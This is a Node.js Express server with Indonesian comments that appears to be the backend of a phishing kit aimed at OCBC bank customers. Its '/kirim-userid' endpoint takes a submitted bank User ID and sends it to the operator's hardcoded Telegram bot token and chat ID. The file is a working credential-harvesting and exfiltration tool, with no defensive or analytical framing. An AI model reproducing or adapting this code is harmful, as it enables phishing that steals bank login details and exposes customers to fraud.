const express = require('express');
const fetch = require('node-fetch');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// 🔧 KONFIGURASI BOT TELEGRAM — GANTI DENGAN MILIK ANDA!
const BOT_TOKEN = '8947782136:AAEjQuwb_sB8kUYsT_X1a5i3liNTERbQ16w'; // Token Bot Father
const CHAT_ID = '8405193617'; // ID Chat/Telegram tujuan kirim data

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public'))); // Letakkan index.html di folder public

// Endpoint terima User ID & kirim ke Telegram
app.post('/kirim-userid', async (req, res) => {
  const { user } = req.body;

  if (!user) {
    return res.json({ ok: false, msg: 'User ID kosong' });
  }

  const pesan = `
📩 Data User ID OCBC
━━━━━━━━━━━━━━━━
🆔 User ID: ${user}
⏰ Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
📍 Lokasi: Palembang, Indonesia
━━━━━━━━━━━━━━━━
  `.trim();

  try {
    const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: pesan,
        parse_mode: 'Markdown'
      })
    });

    const tgData = await tgRes.json();
    
    if (tgData.ok) {
      res.json({ ok: true, msg: 'Terkirim ke Telegram' });
    } else {
      console.error('Telegram Error:', tgData);
      res.json({ ok: false, msg: 'Gagal kirim ke Telegram' });
    }
  } catch (err) {
    console.error('Server Error:', err);
    res.json({ ok: false, msg: 'Kesalahan server' });
  }
});

// Jalankan Server
app.listen(PORT, () => {
  console.log(`🚀 Server berjalan di http://localhost:${PORT}`);
});
